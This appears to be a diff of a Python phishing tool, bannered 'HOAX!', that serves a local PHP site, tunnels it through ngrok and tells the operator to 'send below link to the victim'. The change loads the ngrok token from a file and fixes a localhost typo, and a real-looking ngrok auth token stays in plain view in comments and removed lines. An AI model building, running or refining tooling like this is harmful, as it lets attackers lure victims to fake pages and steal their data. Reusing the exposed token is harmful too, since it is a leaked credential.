@@ -7,6 +7,13 @@ import pyfiglet
 import os
 import credentials
 
+def get_key():   
+    f = open("ngrok_api_log.txt", "r")
+    lines = f.read().split("\n")
+    return lines[0]
+
+NGROK_KEY = get_key().strip()
+
 # auth_key = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
 ascii_banner = pyfiglet.figlet_format("HOAX!")
 print()
@@ -164,14 +171,15 @@ def server_run(str_path, prt):
     comd = "php -S localhost:" + str(prt) + " -t " + str_path
     print(" [+] server running on port: " + str(PORT))
     time.sleep(3)
-    print(" [+] Link:> http://1270.0.0.1:" + str(PORT))
+    print(" [+] Link:> http://127.0.0.1:" + str(PORT))
     time.sleep(3)
     print(" [+] Link:> http://localhost:" + str(PORT))
     time.sleep(3)
     # Star the server
     try:
         print(" [+] Send below link to the victim. ")
-        conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
+        # conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
+        conf.get_default().auth_token = NGROK_KEY
         url = ngrok.connect(PORT, "http")
         print(" [+] "+ str(url))
         time.sleep(3)
